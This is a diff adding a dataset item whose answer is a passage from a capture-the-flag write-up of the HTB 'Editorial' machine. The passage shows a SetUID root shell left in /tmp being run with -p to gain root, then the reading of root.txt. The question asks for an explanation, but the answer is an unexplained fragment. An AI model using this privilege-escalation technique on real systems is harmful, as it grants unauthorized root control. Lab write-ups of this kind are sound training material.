@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Editorial Hacks Stuff)
+
+CONTEXT:
+Source: Htb Editorial Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+Please make sure you have the correct access rights and the repository exists. ' It errors, but the SetUID/SetGID sh is there: prod@editorial:/$ ls -l /tmp/0xdf -rwsrwsrwx 1 root root 125688 Jun 19 18:52 /tmp/0xdf sh is actually the dash shell: prod@editorial:/$ ls -l /bin/sh lrwxrwxrwx 1 root root 4 Mar 23 2022 /bin/sh -> dash So I’ll need to run with -p to keep the privs: prod@editorial:/$ /tmp/0xdf -p # id uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod) And I can read root.txt : # cat root.txt 02094d7b************************
